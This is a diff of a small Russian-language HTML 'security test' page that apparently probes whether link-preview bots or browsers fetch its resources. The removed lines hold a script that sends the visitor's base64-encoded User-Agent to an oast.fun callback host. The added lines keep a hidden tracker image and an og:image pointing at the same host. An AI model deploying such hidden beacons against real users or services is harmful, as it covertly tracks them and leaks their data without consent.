@@ -1,23 +1,13 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
     <meta charset="UTF-8">
-    <title>Security Test Page</title>
-    
-    <meta property="og:title" content="Служба проверки ссылок">
-    <meta property="og:description" content="Анализ безопасности узла...">
-    <meta property="og:image" content="https://esqbwjbyepcxrsacleqf1vwxegka3zfhe.oast.fun/preview.png">
-
-    <script>
-        // Попытка отправить данные, если бот все же исполняет JS
-        fetch('https://esqbwjbyepcxrsacleqf1vwxegka3zfhe.oast.fun/log?info=' + btoa(navigator.userAgent))
-            .catch(err => console.log('Сбор данных инициирован'));
-    </script>
+    <meta property="og:image" content="https://esqbwjbyepcxrsacleqf1vwxegka3zfhe.oast.fun/bot_tracker.png">
+    <meta property="og:title" content="Проверка связи">
+    <meta property="og:description" content="Если видишь это, запрос ушел на сервер">
 </head>
 <body>
-    <h1>Анализ запущен...</h1>
-    <p>Если вы видите это в браузере, скрипт попытался отправить ваш User-Agent на сервер сбора.</p>
-    
-    <img src="https://esqbwjbyepcxrsacleqf1vwxegka3zfhe.oast.fun/tracker.img" style="display:none;">
+    <h1>Тест запущен</h1>
+    <img src="https://esqbwjbyepcxrsacleqf1vwxegka3zfhe.oast.fun/browser_tracker.png" style="display:none;">
 </body>
 </html>
